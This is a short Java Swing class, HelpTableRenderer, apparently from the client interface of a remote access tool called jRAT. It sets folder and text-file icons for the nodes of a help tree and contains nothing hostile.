package pro.jrat.client.ui.renderers.table;

import java.awt.Component;

import javax.swing.Icon;
import javax.swing.JTree;
import javax.swing.tree.DefaultTreeCellRenderer;

import pro.jrat.client.utils.IconUtils;

@SuppressWarnings("serial")
public class HelpTableRenderer extends DefaultTreeCellRenderer {

	public static final Icon folder = IconUtils.getFileIconFromExtension(null, true);
	public static final Icon file = IconUtils.getFileIconFromExtension(".txt", false);

	public Component getTreeCellRendererComponent(JTree tree, Object value, boolean sel, boolean expanded, boolean leaf, int row, boolean hasFocus) {
		super.getTreeCellRendererComponent(tree, value, sel, expanded, leaf, row, hasFocus);

		if (leaf) {
			setIcon(file);
		} else {
			setIcon(folder);
		}

		return this;
	}
}
